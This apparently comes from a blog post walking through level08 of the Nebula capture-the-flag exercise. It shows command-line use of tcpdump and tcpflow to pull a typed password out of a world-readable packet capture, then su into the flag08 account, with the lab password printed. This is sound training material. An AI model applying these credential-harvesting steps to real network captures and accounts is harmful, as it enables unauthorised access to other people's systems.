"World readable files strike again. Check what that user was up to, and use it to log into flag08 account."

This was the verbiage provided in the *About* section for [level08].

<!--more-->

The first step I took was to check the home directory for flag08.

        level08@nebula:/home/flag08$ ls -l
        total 9
        -rw-r--r-- 1 root root 8302 2011-11-20 21:22 capture.pcap


It contained a world readable capture file, let's see what the "the user was up to." I ran the capture file through *tcpdump* to search for any credentials:

        level08@nebula:/home/flag08$ tcpdump -nnAr capture.pcap | grep -i pass
        reading from file capture.pcap, link-type EN10MB (Ethernet)
        **Password: **

It appears that password is mentioned in the output. I could move capture.pcap off the system and run it through *wireshark* to follow the TCP stream, but decided to stick to the command-line.

I used the tool *tcpflow* to follow the users activity:

        level08@nebula:/home/flag08$ tcpflow -C -r capture.pcap
        ..%
        ..%

        Login incorrect
        wwwbugs login:

The capture caught the user attempting to login to wwwbugs. The login was incorrect, but may have been mistyped.

The output contains a few deletions, which confirms that the user had forgotten some details like "m8" vs. "mate." Let's try to login using "backd00Rmate":

        level08@nebula:/home/flag08$ su flag08
        Password:
        sh-4.2$ id
        uid=991(flag08) gid=991(flag08) groups=991(flag08)
        sh-4.2$ getflag
        You have successfully executed getflag on a target account

Looks like the password I chose was correct. The tricky part of this challenge was finding the "login incorrect" statement, which steered me away from using other combinations of  "backdoor...00Rm8.ate"
